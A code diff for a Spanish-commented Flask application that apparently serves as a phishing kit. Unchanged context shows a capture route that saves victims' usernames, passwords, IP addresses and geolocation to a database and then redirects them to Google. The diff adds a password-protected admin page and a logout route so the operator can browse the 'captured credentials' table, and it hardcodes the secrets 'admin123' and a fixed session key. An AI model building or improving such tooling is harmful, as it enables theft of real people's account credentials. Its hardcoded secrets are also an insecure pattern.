@@ -6,9 +6,10 @@ import requests
 import hashlib
 import re
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect, jsonify, abort
+from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
 
 app = Flask(__name__)
+app.secret_key = 'clave-secreta-para-session-12345'  # Necesaria para la sesión
 
 # Config
 CONFIG = {
@@ -17,7 +18,8 @@ CONFIG = {
     'telegram_chat': None,
     'redirect_url': 'https://www.google.com',
     'template': 'google',
-    'api_key': 'cambia-esta-clave'
+    'api_key': 'cambia-esta-clave',
+    'admin_password': 'admin123'  # <-- CAMBIA ESTA CONTRASEÑA
 }
 
 def load_config():
@@ -294,11 +296,79 @@ def capture():
     return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
 
 # =============================================
-# NUEVA RUTA PARA VER CREDENCIALES SIN API KEY
+# RUTA DE LOGIN PARA VER CREDENCIALES
 # =============================================
+@app.route('/login-credenciales', methods=['GET', 'POST'])
+def login_credenciales():
+    """Página de login para acceder a las credenciales"""
+    if request.method == 'POST':
+        password = request.form.get('password')
+        if password == CONFIG.get('admin_password', 'admin123'):
+            session['admin_logged'] = True
+            return redirect('/ver-credenciales')
+        else:
+            return render_template_string('''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Acceso Denegado</title>
+                <style>
+                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+                    .error { color: red; margin-top: 10px; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>🔒 Contraseña incorrecta</h1>
+                    <p class="error">Inténtalo de nuevo</p>
+                    <a href="/login-credenciales">Volver</a>
+                </div>
+            </body>
+            </html>
+            ''')
+    
+    # Mostrar formulario de login
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Acceso a Credenciales</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+            body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+            h1 { color: #1a73e8; margin-bottom: 20px; font-size: 24px; }
+            .lock { font-size: 48px; margin-bottom: 15px; }
+            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+            input:focus { outline: none; border-color: #1a73e8; }
+            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+            button:hover { background: #1557b0; }
+            .footer { margin-top: 20px; color: #666; font-size: 14px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="lock">🔐</div>
+            <h1>Acceso a Credenciales</h1>
+            <p style="color:#666; margin-bottom:20px;">Introduce la contraseña de administrador</p>
+            <form method="POST">
+                <input type="password" name="password" placeholder="Contraseña" required autofocus>
+                <button type="submit">Acceder</button>
+            </form>
+            <div class="footer">Acceso restringido</div>
+        </div>
+    </body>
+    </html>
+    ''')
+
 @app.route('/ver-credenciales')
 def ver_credenciales():
-    """Muestra las credenciales en formato HTML legible"""
+    """Muestra las credenciales - requiere login"""
+    # Verificar si el usuario ha iniciado sesión
+    if not session.get('admin_logged'):
+        return redirect('/login-credenciales')
+    
     conn = sqlite3.connect('credentials.db', check_same_thread=False)
     cursor = conn.cursor()
     cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
@@ -316,6 +386,8 @@ def ver_credenciales():
         <style>
             body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
             h1 { color: #1a73e8; text-align: center; }
+            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; }
+            .logout:hover { background: #c82333; }
             table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
             th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
             td { padding: 10px; border-bottom: 1px solid #ddd; }
@@ -324,6 +396,7 @@ def ver_credenciales():
         </style>
     </head>
     <body>
+        <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
         <h1>🔐 Credenciales Capturadas</h1>
         <p style="text-align:center; color:#666;">Total: <strong>"""+str(len(rows))+"""</strong></p>
         <table>
@@ -358,6 +431,12 @@ def ver_credenciales():
     </html>
     """
     return html
+
+@app.route('/logout-credenciales')
+def logout_credenciales():
+    """Cerrar sesión"""
+    session.pop('admin_logged', None)
+    return redirect('/login-credenciales')
 
 @app.route('/api/credentials')
 def api_credentials():
